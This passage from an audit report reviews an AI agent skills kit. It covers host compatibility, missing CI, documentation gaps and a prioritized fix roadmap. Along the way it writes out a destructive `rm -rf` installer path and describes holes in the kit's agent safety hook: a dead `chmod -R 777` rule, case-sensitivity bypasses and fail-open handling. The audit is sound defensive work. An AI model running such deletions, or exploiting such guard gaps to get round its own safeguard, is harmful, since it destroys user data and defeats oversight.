- References are correctly pay-per-use (summed: uiux 1.56k is the largest single on-demand cost).
- **The kit's real always-loaded cost is therefore ~20–35× smaller than conventional ECC-style kits** for the description index, which is the only *always-costed* component. This supports a scoped "≈5% of always-loaded context cost" claim — recommend rewording to exactly that, and dropping unscoped "~5%".

### 6.3 Proposed benchmark design (delivered; not executed)

The full A/B/C execution benchmark could not be run in this audit environment — it requires scheduled execution of 3 agent configurations over ≥20 tasks with fixed API budgets, and defensible metrics. It is specified here, completely, so it can be run later; **no fabricated numbers are reported.**

| Item | Spec |
|---|---|
| Configs | A: baseline agent, no extra skills · B: agent + a recognized heavyweight kit · C: agent + tokenless-skills |
| Held constant | same model+version, same temp/reasoning settings, identical tool permissions, identical repo snapshot per task, same wall/token budget cap, same no-cache state (fresh session per task to make input tokens comparable, per §note below) |
| Tasks (20) | repo-understanding 3 · feature 4 · debugging 4 · refactoring 3 · testing 2 · security 2 · review 2 (each with fixed initial repo state, explicit expected outcome, objective pass script) |
| Metrics | input/output/cached/total tokens, tool calls, model calls, retries, wall time, success rate, test pass rate, regressions, defect severity, interventions; repeated ≥3× per cell, report median + IQR |
| Main metric | successfulTasks ÷ totalTokens (report per category too) |
| Cached-token caveat | measured total input tokens must be reported separately from cached counts; never conflate cache-hit cheapness with smaller context |

Also shipped as part of Phase 5: the worst-case token budget of the *kit itself* belongs in CI (see §8 checklist), not only in SKILL_MASTER prose.

---

## 7. Host compatibility

Web-grounded where possible; everything otherwise labeled **theoretical**.

| Host | Installer dir | Discovery | Activation | Frontmatter | Hooks/guard | Installer tested | Verdict |
|---|---|---|---|---|---|---|---|
| Claude Code | `~/.claude/skills` / `.claude/skills` | ✅ standard Agent Skills | `/skill` picker; auto-match | ✅ name/desc/license | ❌ no hook integration | ✅ (sandbox) | **Verified** (skills); guard theoretical |
| Codex CLI | `~/.codex/skills` / `.codex/skills` | skills support reported; mixed evidence on native-ness across versions | prompt/stdin | ✅ | ❌ | ✅ (filesystem only) | **Partially verified** — no runtime test performed; spec-brainstorm's `ask_user_question` may not exist |
| OpenCode | `~/.config/opencode/skills` / `.opencode/skills` | OpenCode reads skill folders (sources confirm `.claude/skills` compat) | `@` mentions (per SKILL_MASTER §10) | ✅ | ❌ | ✅ (filesystem only) | **Partially verified** |
| Vibe | `~/.vibe/skills` / `.vibe/skills` | ✅ | `/`, `$` | ✅ | ✅ **full** (hooks.toml + guard + qa + reviewer/plan agents) | ✅ (filesystem) | **Partially verified** for hooks (matches Vibe hook contract per docstring; hooks.toml name-override semantics claimed in comment, not tested live) |
| Gemini CLI | `~/.gemini/skills` / `.gemini/skills` | ✅ (Agent Skills, stable; **activation has a user consent prompt**) | auto match | ✅ | ❌ | ✅ (filesystem only) | **Partially verified** |
| Antigravity | `~/.gemini/config/skills` global; **project dir `.agents/skills` while README implies same as gemini** | unverified | unverified | ✅ | ❌ | ✅ (filesystem only) | **Theoretical** |
| Cursor | `~/.cursor/skills` / `.cursor/skills` | ✅ Cursor 2.4+ supports Agent Skills | auto; review in sandbox | ✅ | ❌ (Cursor uses its own hooks, not integrated) | ✅ (filesystem only) | **Partially verified** |
| "Cursos" (README) | n/a | — | — | — | — | — | **Unsupported/typo** — README lists both Cursor and Cursos; likely duplicate/typo |
| Any Agent Skills host (`.agents/skills`) | `~/.agents/skills` / `.agents/skills` | spec-defined | spec-defined | ✅ | ❌ | ✅ (filesystem only) | **Theoretical** (spec-level only) |
| opencat (installer-only host) | `~/.opencat/skills` | undocumented publicly | — | — | ❌ | filesystem only | **Undocumented in README** — installer knows a host the README never mentions |

**Rule respected by this audit:** no host is claimed supported merely because files copy cleanly. Confirmed gaps: (a) memory rules block seeds on 5 hosts only; (b) guard only exists for Vibe; (c) spec-brainstorm's interactive tool is host-specific; (d) eval-harness CLI flags drift per host.

---

## 8. Testing and CI

**Current state: none.** No `tests/`, no `.github/`, no `scripts/`, no `check_skills.py`. The only "test" is SKILL_MASTER's manual validation protocol, which references the absent executable. Consequences already observable in-repo: doctrine-drift (13-vs-14 count), missing files (check_skills.py, task-templates.md), and every installer bug in §3.

**Recommended minimal test architecture (stdlib only, one workflow, ~90 lines total):**

1. `tests/test_skills.py` (≈40 lines, `unittest`): for every `skills/*/SKILL.md` — frontmatter keys exact (name, description, license, metadata.version), name == folder, desc ≤250, non-empty body lines ≤50, ends with Output/Escape section (per doctrine), version registry consistency, no `{user}` placeholders, no broken relative references (check each `references/…` + `scripts/…` cited in the body exists, and `prompts/task-templates.md` either exists or the reference is removed).
2. `tests/test_guard.py` (≈60 lines): the matrix of §5.4 (subprocess-invoke guard.py).
3. `tests/test_install.sh` (≈40 lines): run installer in a fake `$HOME` (as done in this audit): fresh/install-over/unrelated-skill-preserved/glob-guard/`BASH_SOURCE` fault (run `bash < install.sh` and expect clean failure or `--from` bootstrap success), `--dry-run` writes nothing.
4. `.github/workflows/ci.yml`: `on: push/pull_request`, `permissions: contents: read`, 3 steps: shellcheck install.sh · run the 3 suites on ubuntu + windows-latest (host paths are `$HOME`-based) · markdown link check of README. Nothing else — no matrix bloat, no third-party actions beyond `actions/checkout@v5` (pin by SHA).

**CI pinning note:** when added, pin every action by full SHA; today the absence of CI is not itself a vulnerability.

---

## 9. Documentation & DX

| Item | Finding |
|---|---|
| README install (curl) | ❌ `{user}` placeholder; and the command is the broken `curl\|bash` path (§3.1-C). A new developer following README step 1 hits an abort on line 9. |
| README install (project) | ✅ `./install.sh` works, but installs 9 host trees (§3.1-I) — should say so. |
| Skills table | ✅ accurate (14/14 match folder names and purposes). |
| Host list | ⚠️ 8 hosts listed incl. typo "Cursos"; installer knows 9 (opencat undocumented); "Antigravity" unverified. |
| Claims | ⚠️ §6.1 — reword. |
| Uninstall/update/upgrade | ❌ absent entirely — no instructions at all for the two most common post-install operations; installer offers none either. |
| Security limitations | ❌ no mention that guard is best-effort/fail-open/not-a-sandbox (its own docstring says so). |
| Troubleshooting | ❌ none (e.g., what to do when a host shows no skills; memory file location). |
| SKILL_MASTER references | ❌ `scripts/check_skills.py` missing; `scripts/install.sh` wrong path; "13 shipped ones" stale; `prompts/task-templates.md` missing. |
| extras/chatbot/SKILLS.txt | ⚠️ 30 KB unsynced duplicate; its header instructs "copy everything below" — frontmatter already garbled (`## design-review` / `---` / `---`). Suggest generating it from skills/ in CI or dropping it. |
| Hooks/qa/guard messages | ⚠️ Spanish messages in guard.py/qa.py/plan.toml vs English doctrine ("English only… Spanish lives in AGENTS.md" — auto-violated by the kit's own runtime texts; for kit-wide portability, English defaults + locale override would be consistent). |
| LICENSE | ✅ MIT, present. |
| New-developer test | Minimal path works only via clone-then-run; anyone using the advertised one-liner fails at step 1. Update needs external assistance (no docs). Verdict: **setup DX is currently 1/3 steps correct.** |

---

## 10. Competitive positioning

| Dimension | tokenless-skills | Everything Claude Code (ECC) | Superpowers | Plain AGENTS.md |
|---|---|---|---|---|
| Always-loaded cost | ~0.7k tok | high (multi-K index + hooks/dashboard context) | high (many branch-loaded steps) | 1–3k (whole file) |
| Worst-case per task | ~2–4k | 10–25k | 5–15k | n/a |
| Workflow coverage | 14 focused, pipeline-wired | very broad | broad (TDD/dispatch personas) | repo-specific |
| Portability | 9-path installer, spec-aligned | Claude Code-centric | Claude Code-centric | host-defined |
| Safety tooling | guard (weak but present, Vibe) | hooks stronger | limited | none |
| Self-validation | eval-harness skill (manual) | some | some | none |
| Maintenance risk | **low surface** | high | high | lowest |

**Genuine differentiation:** the doctrine (`SKILL_MASTER.md`) — the tight coupling of budget (≤1000 tok), falsifiability, escape hatches, and the deliberately small surface. Also cross-referenced pipeline skills (spec→plan→tdd→review→verify) with a memory duo, all in ~99 KB with zero runtime deps. This is not a trimmed-down clone; it is a *different point on the Pareto curve*, and desirably so.

**Should NOT implement** (protect the minimalism): dashboards/status UIs, plugin/marketplace machinery, per-skill sub-persona trees, heavyweight meta-frameworks, MTT/telemetry services, its own package manager, host-specific skill forks. Also do not chase ECC's hook breadth — deepen only where measured failures occur (see roadmap).

**Where competitors are genuinely ahead and worth selective learning:** non-destructive install patterns; self-test suites; guard strictness — that's it.

---

## 11. Prioritized remediation roadmap

### P0
1. **Fix the README install path**
   - Problem: primary install method aborts (`BASH_SOURCE[0]` unbound under stdin execution; `set -u`).
   - Evidence: test 13 (`bash < install.sh` → `BASH_SOURCE[0]: unbound variable`); README:9.
   - Files: README.md:7–12, install.sh:9–10.
   - Impact: nobody can install via the documented headline method.
   - Solution: replace `curl|bash` with clone-then-run (see §3.3) **or** `KIT="${BASH_SOURCE[0]:-.}"` fallback + explicit `--from URL` clone mode. Also replace `{user}`.
   - Complexity: S. Acceptance: `bash < install.sh` from a non-repo cwd either fails with a clear message addressed to the user, or installs; README one-liner works verbatim.
2. **Eliminate the `rm -rf <dest>/*` latent deletion**
   - Problem: glob-no-match yields `name="*"` → `rm -rf <host-skills-dir>/*`.
   - Evidence: test 5 (construct prints `rm -rf: /tmp/h5/.claude/skills/*`); install.sh:99–107.
   - Impact: worst-case loss of *every* installed/documented skill on a machine (3rd-party included).
   - Solution: `shopt -s nullglob` + `[ -d "$KIT/skills" ] || exit 1` + iterate a validated array of names.
   - Complexity: S. Acceptance: test with empty/missing skills dir deletes nothing.
3. **No more silent destroys on reinstall**
   - Problem/Impact/Evidence: test 4; install.sh:104–107.
   - Solution: copy-then-swap + backup move per skill (§3.3), `--dry-run` preview.
   - Complexity: S. Acceptance: re-running over customized skill preserves it as backup; installer prints exactly what would change.

### P1
4. Guard dead rule + case-sensitivity: `guard.py:18` `chmod -R 777` unreachable (lowercased input) — lowercase patterns or `re.I`; add `re.I` to protect patterns; document known bypasses in README's security section. Acceptance: §5.4 suite passes case cases. (Complexity: S)
5. `hooks.toml` overwrite w/o backup (install.sh:116–118) → merge-or-skip with notice. (S)
6. protect-mode fail-closed on unexpected/parse-failure input + a documented policy flag. (S)
7. Memory rules block on all 9 hosts or documented as 5-host feature; `spec-brainstorm` interactive-tool fallback line for hosts without `ask_user_question`. (M)
8. Ship `scripts/check_skills.py` + fix SKILL_MASTER stale refs (13→14, paths, missing templates ref). (S)

### P2
9. webcheck.mjs false-positive tuning (ignore favicon/analytics, `--strict` opt-in), vendored axe or SRI, English docs in-file. (M)
10. security-review greps the diff, not the tree; expand secret patterns (`Bearer ey`, generic `-----BEGIN` covered). (S)
11. design-review: anchored 0–10 rubric (2 lines); contrast.mjs: accept 3-digit hex, error path. (S)
12. Project scope installs only chosen hosts by default (`--agent` respected in project scope); document the 9-dir behavior. (S)
13. Uninstall + update instructions (uses the new manifest). (S)
14. sed metachar escaping for `{{KIT_DIR}}`. (S)
15. eval-harness: host-agnostic metric wording; remove/fill missing template ref. (S)

### P3
16. README security-section disclaimers (guard limits), troubleshooting table, "Cursos" typo, SKILLS.txt generation or removal, English default strings for guard/qa messages with locale override, `install.sh` `--scope` validation, eval Harness CI token budget gate (protect the ≤1000 tok doctrine programmatically).

---

## 12. v1.0 readiness verdict

**NOT READY.**

Reasoning: the skill library itself — the product's substance — passes its own doctrine and in static review is at or above the bar of the competitors it benchmarks itself against. But v1.0 of a *distributed* artifact whose headline is a one-command install cannot ship while (a) the documented install command aborts, (b) the installer can in one scenario delete every skill in a user's host directories and in the normal scenario deletes customizations without warning, and (c) the security hook shipped in the kit's name is a best-effort regex filter with a dead destructive-command rule, a case-sensitivity hole, and unconditional fail-open. All P0s above are small (≈1–2 days combined); none requires new architecture. Condition: **CONDITIONALLY READY** the moment P0-1/2/3 and P1-4/5/6 are merged and the minimal CI of §8 gates them.

---

*Method transparency: all "Confirmed" labels are backed by commands executed in this audit (installer in `$HOME`-overridden sandboxes; guard via subprocess; scripts via node); scores marked "static" were not empirically validated against a live agent; token counts are chars/4 estimates because no model tokenizer ran in this environment; the Phase-5 A/B/C benchmark is fully specified but not executed, and no benchmark numbers are asserted.*
